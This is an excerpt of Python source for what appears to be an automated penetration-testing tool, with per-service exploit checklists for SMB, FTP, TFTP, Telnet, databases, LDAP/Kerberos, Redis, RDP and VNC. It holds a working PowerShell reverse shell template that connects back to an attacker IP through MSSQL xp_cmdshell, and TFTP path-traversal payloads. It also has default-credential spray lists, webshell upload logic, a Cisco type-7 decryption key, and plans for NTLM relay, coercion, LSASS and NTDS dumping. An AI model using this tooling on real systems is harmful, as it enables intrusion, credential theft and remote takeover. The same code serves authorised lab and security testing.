# SYSVOL/NETLOGON files worth reading — all GPP XML types, autologin, logon scripts, unattend
_SMB_GPP_RE = re.compile(
    r"(?i)(?:groups|services|scheduledtasks|datasources|printers|drives|registry)\.xml$|"
    r"unattend\.xml$|sysprep\.(?:inf|xml)$|\.(?:bat|cmd|ps1|psm1|vbs|kix)$")


# ── SMB step 5: LLMNR / NBT-NS / mDNS poisoning + NetNTLM capture ──────────────
_SMBPOISON_DEADLINE = 600        # s — how long Responder poisons before self-stopping
_RESPONDER_LOGS = "/usr/share/responder/logs"


# ── SMB step 6: NTLM relay to signing-off hosts → dump SAM ─────────────────────
_SMBRELAY_DEADLINE = 600         # s — how long ntlmrelayx listens before self-stopping


# ── SMB step 7: authentication coercion → drive the relay ──────────────────────
_SMBCOERCE_DEADLINE = 180        # s — overall cap across auth attempts
_COERCE_METHODS = ("Petitpotam", "DFSCoerce", "ShadowCoerce", "Printerbug", "MSEven")


# ── SMB step 8: DC-critical CVEs (DETECTION ONLY) ─────────────────────────────
_SMBDCCVE_DEADLINE = 240         # s — overall cap


# ── SMB step 9: credential spray across hosts (password reuse / lateral) ───────
_SMBSPRAY_DEADLINE = 300         # s — overall cap
_SMBSPRAY_MAX_CREDS = 60         # ceiling on distinct creds sprayed


# ── SMB step 10: valid creds / hash → command execution (confirm the channel) ──
_SMBEXEC_DEADLINE = 240          # s — overall cap


# ── SMB step 11: dump SAM / LSA / LSASS / DPAPI + DCSync (NTDS) ────────────────
_SMBDUMP_DEADLINE = 360          # s — overall cap (NTDS can be slow)
_SMBDUMP_MAX_STORE = 100         # ceiling on NT hashes written back to smb-creds


# ── SMB step 12: writable share → planted LNK for hash capture (WRITES + reversible) ──
_SMBWRITABLE_DEADLINE = 180      # s — overall cap
_SMBWRITABLE_NAME = "~pshunter"  # recognizable, reversible marker for the planted LNK


# ── SMB step 13: foothold — spawn an interactive admin session ─────────────────
def _open_command_terminal(cmd: str) -> "str | None":
    """Open a new terminal with `cmd` pre-typed on the prompt (editable, NOT executed): the
    operator fills in the <PLACEHOLDERS> and presses Enter to run it, then drops into an
    interactive shell. Returns the emulator used, or None when headless so the caller can
    print the command to copy by hand."""
    term = next(((shutil.which(x), flag) for x, flag in _TERM_EMULATORS if shutil.which(x)),
                (None, None))
    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")) or not term[0]:
        return None
    binary, flag = term
    # bash `read -e -i` seeds the readline buffer with the command; the operator edits the
    # placeholders in place, Enter runs it (recorded in history), then we hand over a shell.
    # Escape so the seed reaches readline literally (no $/`/"/\ expansion by the wrapper).
    seed = (cmd.replace("\\", "\\\\").replace('"', '\\"')
               .replace("$", "\\$").replace("`", "\\`"))
    inner = ('IFS= read -e -i "%s" -p "edit <PLACEHOLDERS>, Enter to run > " __c || exit; '
             'history -s "$__c"; eval "$__c"; exec "${SHELL:-/bin/bash}"' % seed)
    try:
        subprocess.Popen([binary] + flag + ["bash", "-c", inner],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        return binary
    except Exception:                                         # noqa: BLE001
        return None


# ── SMB step 14: manual steps (read-only reference, this host's findings substituted) ──
# ── WinRM step 1: confirm the WS-Management transport (unauth, stdlib probe) ────
_WINRM_PORTS = ((5985, False), (5986, True))     # (port, tls) — HTTP and HTTPS WS-Man


# ── WinRM step 2: validate harvested creds/hashes against WinRM (reuse/lateral) ──
_WINRMSPRAY_DEADLINE = 240       # s — overall cap


# ── WinRM step 3: interactive shell (evil-winrm) over a WinRM-capable cred ──────
# ── WinRM step 4: who can log in — Remote Management Users / Administrators ─────
# ── WinRM step 5: post-access recon over the shell (privesc + pivot surface) ────
_HOT_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
              "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
              "SeLoadDriverPrivilege", "SeManageVolumePrivilege", "SeTcbPrivilege"}


# ── WinRM step 6: manual steps (read-only reference, this host's findings substituted) ──
# ── FTP step 1: banner + version → searchsploit (stdlib ftplib) ────────────────
_FTP_KNOWN_VULN = [   # (banner regex, CVE, description) — famous FTP RCE/backdoor versions
    (r"vsftpd\s*2\.3\.4",       "CVE-2011-2523", "vsftpd 2.3.4 backdoor (user ':)') → root shell on 6200"),
    (r"ProFTPD\s*1\.3\.5",      "CVE-2015-3306", "ProFTPD 1.3.5 mod_copy (SITE CPFR/CPTO) → RCE"),
    (r"ProFTPD\s*1\.3\.3c",     "CVE-2010-4221", "ProFTPD 1.3.3c backdoor / telnet IAC → RCE"),
    (r"ProFTPD\s*1\.3\.[0-2]\b", "CVE-2010-4221", "ProFTPD ≤1.3.2 telnet IAC overflow"),
]


# ── FTP step 2: anonymous login → browse the tree (stdlib ftplib) ──────────────
_FTPANON_DEADLINE = 60           # s — wall-clock cap on the walk
_FTPANON_MAXDEPTH = 4
_FTPANON_MAXFILES = 300
# interesting files on an FTP tree: the SMB loot set plus web source / config / DB files
_FTP_LOOT_RE = re.compile(r"(?i)config|\.(?:php|aspx?|jsp|cgi|pl|py|sh|htaccess|db|sqlite3?)$")


# ── FTP step 3: test write access (throwaway upload → verify → delete) ─────────
_FTPWRITE_DEADLINE = 60          # s — wall-clock cap
_FTPWRITE_MAXDIRS = 40           # directories to probe for write access


# ── FTP step 4: known / default / reused credentials (targeted, no wordlist) ───
_FTPCREDS_DEADLINE = 120         # s — wall-clock cap
_FTPCREDS_MAX = 60               # ceiling on login attempts (targeted, not a brute)
_FTP_DEFAULTS = [                # curated FTP defaults — not a wordlist (lockout-safe)
    ("ftp", "ftp"), ("ftp", ""), ("ftp", "password"), ("admin", "admin"), ("admin", ""),
    ("admin", "password"), ("administrator", "administrator"), ("root", "root"), ("root", "toor"),
    ("root", ""), ("ftpuser", "ftpuser"), ("user", "user"), ("guest", "guest"), ("test", "test"),
    ("webadmin", "webadmin"), ("www", "www"),
]


# ── FTP step 5: FTP-writable dir served by a web root → webshell (RCE) ──────────
_FTPWEB_DEADLINE = 120
_FTP_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
_FTP_SHELLS = {   # inert exec-verify payloads (computed math marker — NOT a live command shell)
    "php": (".php", lambda mk, a, b: f"<?php echo '{mk}'.({a}*{b}).'{mk}'; ?>"),
    "asp": (".asp", lambda mk, a, b: f'<% Response.Write("{mk}" & ({a}*{b}) & "{mk}") %>'),
    "jsp": (".jsp", lambda mk, a, b: f'<%= "{mk}"+({a}*{b})+"{mk}" %>'),
}


# ── FTP step 6: FTP-bounce (PORT) → scan the server's internal ports ───────────
_FTPBOUNCE_DEADLINE = 120
_BOUNCE_PORTS = {   # internal-only services worth finding via bounce (port → hint)
    22: "SSH", 23: "Telnet", 25: "SMTP", 445: "SMB", 1433: "MSSQL", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 5985: "WinRM", 6379: "Redis", 8000: "http-alt",
    8080: "http-alt", 8443: "https-alt", 9200: "Elasticsearch", 11211: "Memcached",
    15672: "RabbitMQ", 27017: "MongoDB",
}


# ── FTP step 7: foothold — pick a viable path to a shell ───────────────────────
# ── FTP step 8: manual steps & further research (reference only, context-aware) ─
# ══ TFTP (UDP/69) ══ different beast from FTP: no auth, no listing, no banner, no DELETE.
# Only two primitives — RRQ (read) and WRQ (write) — over connectionless UDP. Pure stdlib
# (there is no tftplib); the protocol is a handful of opcodes on a datagram socket.
_TFTP_RRQ, _TFTP_WRQ, _TFTP_DATA, _TFTP_ACK, _TFTP_ERROR = 1, 2, 3, 4, 5


# ── TFTP step 1: confirm UDP/69 (no auth) + path-traversal arbitrary read ───────
# Traversal payloads for the classic TFTP daemon read bugs (SolarWinds, tftpd32, HP, …).
# We only ASSERT a vuln when the retrieved bytes actually match the target file's signature —
# no CVE token is emitted (the exact CVE is daemon-specific; see tftp-next / searchsploit).
_TFTP_TRAVERSAL = [
    ("etc/passwd",          re.compile(rb"^\w+:.*:0:0:", re.M),                    "unix", "/etc/passwd"),
    ("windows/win.ini",     re.compile(rb"(?i)\[fonts\]|\[extensions\]"),          "win",  "win.ini"),
    ("boot.ini",            re.compile(rb"(?i)\[boot loader\]"),                   "win",  "boot.ini"),
    ("windows/system32/drivers/etc/hosts", re.compile(rb"(?i)localhost"),         "win",  "hosts"),
]
_TFTP_TRAVERSAL_DEPTHS = (5, 7, 9, 12)


# ── TFTP step 2: grab well-known files (no listing → guess names) → grep for creds ─
# TFTP can't list a directory, so enumeration IS filename guessing. This set targets what
# actually lands on a TFTP server in the wild: network-device configs (the richest — they
# leak enable/user creds & SNMP), boot/PXE files, and stray backups/web configs.
_TFTP_WORDLIST = [
    # network device configs — the jackpot (Cisco/Juniper/HP/etc.)
    "running-config", "startup-config", "running.cfg", "startup.cfg", "config.text",
    "config.cfg", "config.txt", "config.xml", "nvram", "router-config", "router.cfg",
    "switch-config", "switch.cfg", "backup-config", "backup.cfg", "cisco.cfg", "confg",
    # VoIP phone provisioning
    "SEPDefault.cnf", "SIPDefault.cnf", "XMLDefault.cnf.xml", "0000000000000.cnf.xml",
    "gk.cfg", "g3.cfg",
    # PXE / boot
    "pxelinux.cfg/default", "pxelinux.0", "boot.ini", "grub.cfg",
    # backups / archives operators drop here
    "backup.tar", "backup.zip", "backup.tgz", "config.bak", "flash.bin",
    # windows / app configs & the odd secret file
    "web.config", "unattend.xml", "sysprep.xml", ".env", "passwd", "shadow", "id_rsa",
]
_TFTPGRAB_DEADLINE = 90          # s — wall-clock cap on the whole sweep
_TFTPGRAB_MAXBYTES = 262144      # per file (256 KiB) — configs are small; don't slurp firmware

# Cisco type-7 is trivially reversible (fixed-key Vigenère) → decrypt to a usable cred.
_C7_KEY = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"


# ── TFTP step 3: test write access (WRQ) — non-reversible, TFTP has no DELETE ────
# ── TFTP step 4: manual steps & further research (reference only, context-aware) ─
# ══ Telnet (23) ══ cleartext remote login — a fast HTB foothold via no-auth shells, weak/default
# creds or device backdoors. Raw socket (telnetlib was removed in 3.13): we answer IAC option
# negotiation (refuse everything) so the server sends its banner/prompt, then fingerprint it and,
# when no login is demanded, probe for an unauthenticated shell with a computed marker.
_TELNET_PROMPT_LOGIN = re.compile(r"(?i)(?:login|user\s?name|username)\s*:\s*$")
_TELNET_PROMPT_PASS = re.compile(r"(?i)password\s*:\s*$")


# ── Telnet step 2: known / default / reused credentials (targeted, lockout-safe) ──
_TELNETCREDS_DEADLINE = 120       # s — wall-clock cap
_TELNETCREDS_MAX = 60             # ceiling on login attempts (targeted, not a brute)
_TELNET_DEFAULTS = [              # curated telnet / device defaults — not a wordlist
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "admin"), ("root", "password"),
    ("root", "calvin"), ("root", "default"), ("root", "1234"), ("admin", "admin"), ("admin", ""),
    ("admin", "password"), ("admin", "1234"), ("admin", "admin123"), ("administrator", "administrator"),
    ("user", "user"), ("guest", "guest"), ("guest", ""), ("cisco", "cisco"), ("support", "support"),
    ("ubnt", "ubnt"), ("pi", "raspberry"),
]


# ── Telnet foothold: auto-login interactive session (spawned via spawn-shell) ──
_TELNET_SHELL_SRC = r'''
import socket, sys, os, select, time
IP = __IP__
PORT = __PORT__
USER = __USER__
PW = __PW__
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
st = [0]; opt = [None]
def feed(data):
    out = bytearray(); rep = bytearray()
    for b in data:
        if st[0] == 0:
            if b == 255: st[0] = 1
            else: out.append(b)
        elif st[0] == 1:
            if b in (251, 252, 253, 254): opt[0] = b; st[0] = 2
            elif b == 250: st[0] = 3
            elif b == 255: out.append(255); st[0] = 0
            else: st[0] = 0
        elif st[0] == 2:
            if opt[0] == 253: rep += bytes((255, 252, b))
            elif opt[0] == 251: rep += bytes((255, 254, b))
            st[0] = 0
        elif st[0] == 3:
            st[0] = 4 if b == 255 else 3
        elif st[0] == 4:
            st[0] = 0 if b == 240 else 3
    if rep:
        try: s.sendall(bytes(rep))
        except OSError: pass
    return bytes(out)
if USER:
    buf = b""; su = sp = False; end = time.time() + 15
    while time.time() < end and not sp:
        r, _, _ = select.select([s], [], [], 0.5)
        if s in r:
            try: d = s.recv(4096)
            except OSError: break
            if not d: break
            c = feed(d); buf += c
            os.write(1, c)
            low = buf.lower()
            if not su and (b"login:" in low or b"username:" in low):
                s.sendall((USER + "\r\n").encode()); su = True; buf = b""
            elif su and not sp and b"password" in low:
                s.sendall((PW + "\r\n").encode()); sp = True; buf = b""
try:
    import termios, tty
    old = termios.tcgetattr(0); tty.setraw(0)
except Exception:
    old = None
try:
    while True:
        r, _, _ = select.select([0, s], [], [])
        if 0 in r:
            d = os.read(0, 1024)
            if not d: break
            s.sendall(d)
        if s in r:
            d = s.recv(4096)
            if not d: break
            os.write(1, feed(d))
finally:
    if old is not None:
        try: termios.tcsetattr(0, termios.TCSADRAIN, old)
        except Exception: pass
    s.close()
sys.stdout.write("\n[*] telnet session closed - press enter to close this tab\n")
try: input()
except Exception: pass
'''


# ── Telnet step 3: sniff cleartext creds off the wire (passive; MITM stays manual) ──
_TELNETSNIFF_DEADLINE = 300       # s — capture window before it self-stops
_TELNETSNIFF_MAXBUF = 65536       # cap per-direction reassembly


# ── Telnet step 4: manual steps & further research (reference only, context-aware) ─
# ══ MySQL / MariaDB (3306) ══ the initial handshake leaks the server version in cleartext (no
# auth), so the banner is pure stdlib; auth/queries later go through netexec (binary protocol).
# ── MySQL step 2: root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x ──
_MYSQLCREDS_DEADLINE = 120
_MYSQLCREDS_MAX = 60
_MYSQL_BYPASS_TRIES = 256        # CVE-2012-2122: ~1/256 wrong-password auths slip through
_MYSQL_DEFAULTS = [
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "mysql"), ("root", "password"),
    ("root", "admin"), ("root", "123456"), ("root", "P@ssw0rd"), ("admin", "admin"),
    ("mysql", "mysql"), ("user", "user"), ("test", "test"), ("dbuser", "dbuser"), ("web", "web"),
]


# ── MySQL step 3: loot — enumerate DBs/users, dump hashes & app creds, LOAD_FILE ──
_MYSQLLOOT_DEADLINE = 120
_MYSQL_SYSDB = ("information_schema", "performance_schema", "sys", "mysql")


# ── MySQL step 4: RCE — INTO OUTFILE webshell (FILE priv), UDF guidance ────────
_MYSQLRCE_DEADLINE = 90
_MYSQL_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
_MYSQL_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
                   "/var/www/htdocs", "/app/public", "/var/www/html/uploads"]


# ── MySQL step 5: manual steps & further research (reference only, context-aware) ─
# ══ PostgreSQL (5432) ══ no unauthenticated banner: the server only declares its server_version
# after a successful login. What IS reachable pre-auth is the wire handshake — an SSLRequest tells
# us whether TLS is offered, and a StartupMessage makes the server declare its required auth method
# (trust / cleartext / md5 / SCRAM) or return a structured pg_hba error. All pure stdlib; creds /
# loot / RCE go through the psql CLI (netexec has no postgres protocol).
_PG_PROTO_V3 = 196608            # protocol 3.0
_PG_SSL_MAGIC = 80877103         # SSLRequest sentinel
_PG_AUTH = {0: "trust (no password)", 2: "KerberosV5", 3: "cleartext password",
            5: "MD5 password", 6: "SCM credential", 7: "GSSAPI", 9: "SSPI",
            10: "SASL / SCRAM-SHA-256"}


# ── PostgreSQL step 2: postgres blank/default + reused creds; flag superuser ──────
_PGCREDS_DEADLINE = 120
_PGCREDS_MAX = 60
_PG_DEFAULTS = [
    ("postgres", "postgres"), ("postgres", ""), ("postgres", "password"),
    ("postgres", "admin"), ("postgres", "root"), ("postgres", "postgres123"),
    ("postgres", "P@ssw0rd"), ("postgres", "changeme"), ("postgres", "123456"),
    ("admin", "admin"), ("pgsql", "pgsql"), ("test", "test"),
]


# ── PostgreSQL step 3: loot — DBs/roles, pg_shadow hashes, app creds, pg_read_file ──
_PGLOOT_DEADLINE = 120
_PG_SYSDB = ("template0", "template1")


# ── PostgreSQL step 4: RCE — COPY … FROM PROGRAM command execution (superuser, 9.3+) ──
_PGRCE_DEADLINE = 60


# ── PostgreSQL step 5: manual steps & further research (reference only, context-aware) ─
# ══ MS SQL Server (1433 / 1434) ══ the version is discoverable unauthenticated: the SQL Browser
# (UDP 1434, SSRP) advertises instances + version, and the TDS pre-login on 1433 returns version
# bytes. Both are pure stdlib; auth / xp_cmdshell / queries later go through netexec (TDS binary).
_MSSQL_RELEASE = {16: "2022", 15: "2019", 14: "2017", 13: "2016", 12: "2014",
                  11: "2012", 10: "2008", 9: "2005", 8: "2000"}


# ── MSSQL step 2: sa blank/default + reused creds (netexec mssql, SQL auth) ─────
_MSSQLCREDS_DEADLINE = 120
_MSSQLCREDS_MAX = 50
_MSSQL_DEFAULTS = [
    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "Password1"), ("sa", "P@ssw0rd"),
    ("sa", "sql"), ("sa", "sa123"), ("sa", "admin"), ("sa", "sqlserver"), ("sa", "changeme"),
    ("admin", "admin"), ("sql", "sql"), ("mssql", "mssql"), ("sqladmin", "sqladmin"),
]


# ── MSSQL step 3: xp_cmdshell OS command execution (sysadmin) → foothold ────────
# PowerShell TCP reverse shell (base64 for `powershell -e`), fired through xp_cmdshell.
_MSSQL_PS_REVSHELL = (
    "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
    "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()")


# ── MSSQL step 4: loot — databases, linked servers, sql_login hashes, OPENROWSET ──
_MSSQL_SYSDB = ("master", "tempdb", "model", "msdb")


# ── MSSQL step 5: manual steps & further research (reference only, context-aware) ─
# ══ SSH (22 / 2222) ══ the version banner and the KEXINIT algorithm lists are exchanged in the
# clear before auth, so the fingerprint is pure stdlib; auth / shell come later (ssh CLI / netexec).
# ── SSH step 2: reused / known creds (targeted, lockout/fail2ban-aware) → shell ─
_SSHCREDS_DEADLINE = 120
_SSHCREDS_MAX = 40
_SSH_DEFAULTS = [
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "admin"), ("root", "raspberry"),
    ("admin", "admin"), ("user", "user"), ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("git", "git"),
    ("test", "test"), ("oracle", "oracle"), ("vagrant", "vagrant"), ("msfadmin", "msfadmin"),
    ("guest", "guest"),
]


# ── SSH step 3: manual steps & further research (reference only, context-aware) ──
# ══ LDAP / Active Directory (389 / 636 / 3268 / 3269) ══ AD enumeration over LDAP. netexec is the
# engine (binary LDAP/BER); creds reused from the SMB phase unlock the rich enumeration.
_LDAPENUM_DEADLINE = 180


# ── LDAP step 2: AS-REP roast (no creds) + Kerberoast (any domain cred) → hashes ─
# ── LDAP step 3: loot — LAPS, gMSA, user-description secrets, BloodHound collect ─
# ── LDAP step 4: manual steps & further research (reference only, context-aware) ─
# ══ Oracle Database (1521 …) ══ the TNS listener speaks a binary protocol and there is no sqlplus /
# odat client guaranteed on the box, so the automated phase is stdlib TNS probing + nmap's Oracle NSE
# (version, SID brute, default-account brute). Authenticated file-read / RCE go through odat + a valid
# SID + creds and stay in the reference step (oracle-next). netexec has no oracle protocol.
_TNS_CMD_TIMEOUT = 6.0
_ORACLE_SID_DEADLINE = 180
_ORACLE_CREDS_DEADLINE = 180
# classic default account:password pairs — one password per account (no lockout, like smb-spray)
_ORACLE_DEFAULTS = [
    ("system", "manager"), ("sys", "change_on_install"), ("scott", "tiger"),
    ("dbsnmp", "dbsnmp"), ("system", "oracle"), ("sys", "oracle"), ("oracle", "oracle"),
    ("system", "admin"), ("hr", "hr"), ("outln", "outln"), ("mdsys", "mdsys"),
    ("ctxsys", "ctxsys"), ("xdb", "xdb"), ("wksys", "wksys"), ("system", "manager1"),
    ("sys", "sys"), ("apps", "apps"), ("system", "password"),
]
_ORACLE_DBA = {"sys", "system", "sysman", "dbsnmp"}


# ── Oracle step 4: manual steps & further research (reference only, context-aware) ─
# ══ Kerberos (88 / 464) ══ the AD authentication service. Its distinct value is what works over
# port 88 WITHOUT credentials or an LDAP bind: AS-REQ user enumeration and AS-REP roasting, plus a
# quiet pre-auth password spray. impacket (GetNPUsers / GetUserSPNs / getTGT) + nmap krb5-enum-users
# are the engines. Validated logins are stored as domain creds so LDAP/SMB reuse them; delegation &
# ticket attacks stay in the reference step. Complements the LDAP/AD phase (ldap-roast) over 389.
_KRB_ENUM_DEADLINE = 180
_KRB_SPRAY_DEADLINE = 180
_KRB_USER_SEED = [
    "administrator", "guest", "krbtgt", "admin", "administrador", "user", "test", "info",
    "service", "svc", "svc_sql", "svc-sql", "sqlsvc", "sql", "mssql", "svc_backup", "backup",
    "svc_web", "web", "www", "http", "ftp", "ldap", "exchange", "smtp", "mail", "helpdesk",
    "operator", "support", "manager", "dev", "developer", "jenkins", "git", "oracle",
    "postgres", "tomcat", "sysadmin", "netadmin", "dbadmin", "printsvc", "scanner", "vpn",
    "remote", "default", "audit", "security", "vagrant", "ansible", "sccm", "veeam",
    "j.smith", "jsmith", "asmith", "adminuser", "serviceaccount", "testuser", "sharepoint",
]


# ── Kerberos step 4: manual steps & further research (reference only, context-aware) ─
# ══ Redis (6379 / 6380) ══ RESP is a trivial text protocol, so this is pure stdlib. An unauthenticated
# (or weakly-authenticated) Redis is a fast path to RCE — CONFIG SET dir/dbfilename + SAVE writes an
# attacker-controlled file anywhere the redis user can write (webshell / SSH key / cron). Read/loot and
# the webshell RCE are automated + exec-verified; SSH-key / module / replication stay in the reference.
_REDIS_INFO_DEADLINE = 40
_REDIS_LOOT_DEADLINE = 60
_REDIS_DEFAULTS = ["foobared", "redis", "password", "admin", "root", "P@ssw0rd", "123456", "redis123"]
_REDIS_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
                   "/var/www/htdocs", "/app/public"]


# ── Redis step 5: manual steps & further research (reference only, context-aware) ─
# ══ MongoDB (27017 / 27018) ══ there's no mongo/mongosh client on the box, but the wire protocol is
# BSON over OP_QUERY (legacy) / OP_MSG (3.6+), so a minimal stdlib client covers the high-value path:
# an unauthenticated MongoDB → list every database/collection and dump documents (creds/tokens). SCRAM
# auth isn't done in stdlib, so authenticated dumps + default-cred brute go through nmap / mongosh.
_MONGO_OP_REPLY = 1
_MONGO_OP_QUERY = 2004
_MONGO_OP_MSG = 2013
_MONGO_LOOT_DEADLINE = 90
_MONGO_JUICY = re.compile(r"pass|pwd|secret|token|cred|hash|key|auth|user|email|login|flag", re.I)


# ── MongoDB step 4: manual steps & further research (reference only, context-aware) ─
# ══ RDP (3389) ══ the security layer + NLA state is discoverable unauthenticated via the X.224 RDP
# negotiation (pure stdlib); netexec rdp adds the NTLM machine/domain/OS build, and validated creds
# open an interactive rdesktop session. BlueKeep / MS12-020 are version/nmap gated.
_RDP_PROTO_NAMES = {0: "Standard RDP Security", 1: "TLS", 2: "CredSSP (NLA)", 8: "CredSSP-EX", 4: "RDSTLS"}
_RDP_NEG_FAIL = {1: "SSL_REQUIRED_BY_SERVER", 2: "SSL_NOT_ALLOWED_BY_SERVER",
                 3: "SSL_CERT_NOT_ON_SERVER", 4: "INCONSISTENT_FLAGS",
                 5: "HYBRID_REQUIRED_BY_SERVER", 6: "SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER"}
_RDPCREDS_DEADLINE = 150


# ══ VNC (5900-5903) ══ the RFB handshake advertises the security types unauthenticated (pure stdlib),
# so a "None" type = a wide-open desktop; VNC Auth = a single (8-char, DES) password to spray. netexec
# vnc validates passwords; vncviewer opens the desktop. RealVNC auth-bypass (CVE-2006-2369) is nmap-gated.
_VNC_SECTYPES = {0: "Invalid", 1: "None (NO AUTH)", 2: "VNC Auth", 5: "RA2", 6: "RA2ne",
                 16: "Tight", 18: "TLS", 19: "VeNCrypt", 30: "Apple ARD", 35: "UltraVNC MS-Logon II"}
_VNC_DEFAULTS = ["password", "vnc", "123456", "admin", "root", "secret", "12345678",
                 "letmein", "test", "vncpass", "changeme", "raspberry"]


# ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
# service surfaced. A router: it detects which of this host's services have a viable path to a
# shell (from findings already in the DB) and dispatches to that service's existing foothold tool
# (each keeps its own method sub-picker). No re-implementation — pure aggregation.
# tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
# What runs behind each wired step, shown compactly under the checklist line. Verified against
# every _tool_* source. External Kali binaries invoked: whatweb / openssl / searchsploit (each
# IS the step), sqlmap (driven by sqli-scan, only if installed), and — for the SMB phase, where
# a pure-Python client is impractical — netexec (with smbclient/rpcclient/nmap fallback). Every
# HTTP engine is pure stdlib — no john/hashcat/hydra/ffuf/gobuster/wpscan/etc. on that side
# (arjun is reused only as a wordlist file, not run). Per key: (engine label, time-cap text | None).
# tools that harvest hostnames → maintain the managed /etc/hosts block (root) / show the
# paste line (no root); used to print the right sudo notice at launch
_HOSTS_WRITING_TOOLS = {"http-headers", "ssl-cert", "http-source", "vhost-fuzz", "smb-enum"}

# status glyph + colour for a checklist step
_STEP_MARK = {"done": ("✓", GREEN), "skip": ("⊘", MAGENTA), "running": ("⏳", YELLOW),
              None: ("○", DIM)}


def _render_exploit_checklist(ip: str, target: tuple) -> None:
    """One service's pentest checklist: each step with its status (○ to-do / ✓ done /
    ⊘ skip) and, beneath a step, the copy-paste commands it offers (lettered a–z, opened
    with `r <n><letter>`)."""
    port, proto, label, key, ver, signal = target
    _sync_hosts_block(ip)     # entering a host's checklist as root materialises its DB domains → hosts
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    playbook = _STEP_COMMANDS.get(key) or _STEP_COMMANDS["other"]
    status = fetch_step_status(ip, port, proto, key)
    print(f"\n{BOLD}{label} — checklist{RESET}  {DIM}{ip}:{port}/{proto}{RESET}")
    if ver:
        print(f"  {DIM}fingerprint:{RESET} {ver} {DIM}(via {signal}){RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, _ = _step_parts(step)
        st = status.get(i)
        sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
        cmds = playbook.get(i)
        text = f"{BOLD}{desc}{RESET}" if cmds else desc   # runnable → bold
        body = f"{col}{text}{RESET}" if st in ("done", "skip") else text  # done → green line
        print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")
        for j, c in enumerate(cmds or []):
            letter = chr(ord("a") + j)
            print(f"        {DIM}{letter}{RESET}  {c}  {DIM}·  r {i}{letter}{RESET}")


def _run_step_command(target: tuple, n: int, letter: str) -> None:
    """Command-mode `r <n><letter>`: open the chosen command in a new terminal, pre-typed
    on the prompt (editable, NOT executed) so the operator fills the <PLACEHOLDERS> and runs
    it. Headless → print the command to copy by hand. Step status is left to the operator
    (mark it done with <n> when finished)."""
    key = target[3]
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    cmds = _STEP_COMMANDS.get(key, {}).get(n)
    if not cmds:
        if 1 <= n <= len(steps):
            print(f"{DIM}step {n} has no command — do it manually{RESET}")
        else:
            print(f"{RED}✗ no step {n}{RESET}")
        return
    idx = ord(letter) - ord("a") if letter else 0
    if not 0 <= idx < len(cmds):
        print(f"{RED}✗ no command {n}{letter or 'a'}{RESET} {DIM}(step {n} has "
              f"{len(cmds)}: {'-'.join(chr(ord('a') + k) for k in range(len(cmds)))}){RESET}")
        return
    cmd = cmds[idx]
    if os.environ.get("PURRSH_TERM_ID"):                     # inside the PurrSh3ll host app
        row_id = _save_spawn_command(cmd)
        if row_id is not None:
            sys.stdout.write(f"\033]777;psspawncmd;{int(row_id)}\007")   # id-only channel
            sys.stdout.flush()
            print(f"\n{GREEN}▶ opened in a new terminal tab{RESET} {DIM}— edit the "
                  f"<PLACEHOLDERS> and press Enter to run:{RESET}\n  {BOLD}{cmd}{RESET}")
            return
        # DB unavailable → fall through to the external-terminal / headless path
    used = _open_command_terminal(cmd)
    if used:
        print(f"\n{GREEN}▶ opened in {used}{RESET} {DIM}— edit the <PLACEHOLDERS> and press "
              f"Enter to run:{RESET}\n  {BOLD}{cmd}{RESET}")
    else:
        print(f"\n{DIM}headless — copy & run this yourself:{RESET}\n  {BOLD}{cmd}{RESET}")


def _exploit_service_view(ip: str, target: tuple) -> None:
    """One service's checklist: <n> toggles done, s <n> toggles skip, `r <n><letter>` opens
    that step's copy-paste command in a new terminal (pre-typed, edit the <PLACEHOLDERS>,
    Enter to run). Status is saved so progress survives sessions."""
    port, proto, _label, key = target[0], target[1], target[2], target[3]
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]

    def _toggle(n, want):
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        cur = fetch_step_status(ip, port, proto, key).get(n)
        set_step_status(ip, port, proto, key, n, None if cur == want else want)

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "s":                             # bare s → running jobs / tool status
            _status_view()
            return "refresh"
        if v == "f":                             # f → findings harvested from the tools
            _host_findings_view(ip)
            return "refresh"
        if v.startswith("s") and v[1:].strip().isdigit():
            _toggle(int(v[1:].strip()), "skip")
            return "refresh"
        m = re.match(r"r\s*(\d+)([a-z]?)$", v)   # r <n>  or  r <n><letter>
        if m:
            _run_step_command(target, int(m.group(1)), m.group(2))
